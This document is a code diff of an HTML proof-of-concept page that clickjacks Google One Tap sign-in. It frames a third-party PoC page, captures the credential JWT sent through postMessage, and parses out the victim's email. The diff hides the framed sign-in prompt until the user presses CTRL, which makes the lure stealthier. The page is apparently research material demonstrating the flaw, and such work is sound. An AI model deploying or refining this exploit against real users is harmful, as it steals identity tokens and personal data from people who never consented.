@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -10,12 +9,14 @@
 <body>
     <div>
 
-        <iframe src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html" style="border: 1px solid black; opacity: 100%;" width="500px" height="300px"></iframe>
+        <!-- Initially hide the iframe -->
+        <iframe id="clickjackIframe" src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html" style="border: 1px solid black; opacity: 100%; display: none;" width="500px" height="300px"></iframe>
 
         <p>Result: <span id="res"></span></p>
     </div>
 
     <script>
+        // Function to parse the JWT token
         function parse(jwt) {
             const base64Url = jwt.split('.')[1];
             const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
@@ -26,6 +27,15 @@
             return payload;
         }
 
+        // Show the iframe when the CTRL key is pressed
+        window.addEventListener("keydown", function(e) {
+            if (e.ctrlKey) {  // Check if the CTRL key is pressed
+                const iframe = document.getElementById("clickjackIframe");
+                iframe.style.display = "block";  // Show the iframe
+            }
+        });
+
+        // Listen for messages from the iframe
         window.onmessage = (e) => {
             const payload = parse(e.data.credential)
             const email = document.createElement("div")
